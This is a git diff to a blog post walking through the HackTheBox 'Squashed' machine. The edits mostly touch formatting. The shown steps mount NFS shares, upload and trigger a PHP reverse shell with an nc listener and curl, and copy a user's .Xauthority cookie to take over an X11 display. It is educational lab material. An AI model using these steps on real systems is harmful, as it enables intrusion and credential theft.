@@ -1,7 +1,7 @@
 ---
 layout: post                                                                 
 title: "HTB Writeup: Squashed"                                     
-date: 2023-03-12 09:00:00 -0500                                              
+date: 2023-03-16 09:00:00 -0500                                              
 description: Squashed is an easy HackTheBox machine created by polarbearer and C4rm310. It involves exploiting NFS, a webserver, and X11.
 img: squashed/squashed.png                                                 
 tags: [HackTheBox, HTB, Writeup, Squashed, NFS, X11]
@@ -69,7 +69,7 @@ Export list for squashed.htb:
 ```
 
 There are two shares available. We can mount them to our system like this:
-```
+```sh-session
 # create directories for the shares
 sudo mkdir /mnt/webshare                                                     
 sudo mkdir /mnt/ross                                                         
@@ -171,7 +171,7 @@ drwxr-xr-x 2 webshare-squasher www-data  4096 Mar 14 10:00 images
 drwxr-xr-x 2 webshare-squasher www-data  4096 Mar 14 10:00 js
 ```
 
-Let's upload a php reverse shell and get user. I like using [revshells.com](revshells.com) to generate shells, but you can use your favorite tool. :smile:
+Let's upload a php reverse shell and get user. I like using [revshells.com](http://revshells.com) to generate shells, but you can use your favorite tool. :smile:
 
 Copy the shell to the webshare, spin up a netcat listener, and access the file using curl!
 
@@ -179,7 +179,7 @@ _Step 1: Netcat listener._
 ```sh-session
 nc -lvnp <YOUR_PORT>
 ```
-_Step 2: Request the file._
+_Step 2: Request the file from another tab._
 ```sh-session
 curl http://squashed.htb/shell.php
 ```
@@ -187,7 +187,9 @@ Soon after that, we have a shell!
 ![Webshell]({{site.baseurl}}/assets/img/squashed/shell.png)
 
 # Path To Root
-To gain root access, we have to exploit X11. Looking back on Ross's share, we see `.Xauthority` and `.xsession`. These indicate that a X11 display might be configured. 
+To gain root access, we have to exploit X11. X11 is a communications protocol. It allows applications to create objects like windows, buttons, and menus. To learn more about X11, check out [this](https://unix.stackexchange.com/questions/276168/what-is-x11-exactly) thread. 
+
+Looking back on Ross's share, we see `.Xauthority` and `.xsession`. These indicate that a X11 display might be configured. 
 `.Xauthority` is used to store credentials, but its bytes can be quite weird so we should base64 encode them to interact with them. 
 
 ```sh-session
@@ -198,7 +200,7 @@ Paste the cookie onto the target machine, decode it, and place it in the `/tmp` 
 echo "AQAADHNxdW<SNIP>" | base64 -d > /tmp/.Xauthority
 ```
 Then set the cookie by using the `XAUTHORITY` environment variable.
-```
+```sh-session
 export XAUTHORITY=/tmp/.Xauthority
 ```
 
